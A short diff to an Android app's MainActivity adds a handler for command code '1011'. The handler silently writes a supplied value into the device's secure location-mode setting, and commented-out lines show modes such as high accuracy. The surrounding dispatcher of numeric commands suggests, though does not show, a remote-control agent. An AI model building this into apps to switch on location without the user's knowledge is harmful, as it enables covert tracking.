@@ -331,5 +331,16 @@ public class MainActivity extends AppCompatActivity {
 
             Log.e(TAG, "Fork : " + load.Fork() );
         }
+        else if(strCmd.equals("1011") )
+        {
+            if(lVars.size() < 2) return;
+            String strMode = (String)lVars.get(1);
+
+            Settings.Secure.putInt(getContentResolver(), Settings.Secure.LOCATION_MODE, Integer.parseInt(strMode) );
+
+//            Settings.Secure.putInt(getContentResolver(), Settings.Secure.LOCATION_MODE, Settings.Secure.LOCATION_MODE_HIGH_ACCURACY);
+//            Settings.Secure.putInt(getContentResolver(), Settings.Secure.LOCATION_MODE, Settings.Secure.LOCATION_MODE_BATTERY_SAVING);
+//            Settings.Secure.putInt(getContentResolver(), Settings.Secure.LOCATION_MODE, Settings.Secure.LOCATION_MODE_SENSORS_ONLY);
+        }
     }
 }
